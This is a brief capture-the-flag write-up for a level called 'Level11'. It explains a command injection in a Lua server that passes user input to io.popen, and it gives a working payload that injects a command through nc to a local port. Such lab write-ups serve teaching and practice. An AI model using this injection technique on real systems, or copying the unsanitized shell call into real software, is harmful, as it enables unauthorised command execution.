# Level11 Solution

## Vulnerability:
Command injection in the Lua script through unsanitized user input in the `io.popen()` function.

## Steps:
1. The script `level11.lua` runs a server on port 5151
2. It takes user input and passes it directly to `io.popen("echo "..pass.." | sha1sum")`
3. This allows command injection through shell metacharacters

## Exploitation:
**Working payload:**
```bash
echo '"; getflag > /tmp/flag11.txt; echo "' | nc 127.0.0.1 5151